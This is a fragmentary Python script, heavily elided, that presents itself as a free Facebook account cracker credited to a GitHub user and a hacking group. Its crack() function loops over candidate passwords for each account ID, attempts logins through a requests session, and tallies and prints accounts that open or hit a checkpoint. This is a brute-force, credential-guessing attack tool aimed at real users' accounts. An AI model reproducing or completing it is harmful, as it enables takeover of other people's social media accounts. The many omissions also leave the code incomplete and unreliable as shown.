...
def banner():
	clear()
	wel='# WELCOME TO CRACK FACEBOOK FREE'
...
• GITHUB : https://github.com/Clay-XD/
• GROUP : MUSLIM CYBER ARMY
'''
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ ALHAMDULILLAH:%s ☬ SYUKURIN:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='Clay-XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Clay-XD OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]Clay-XD OK[/bold green]'))
					ok+=1
					break
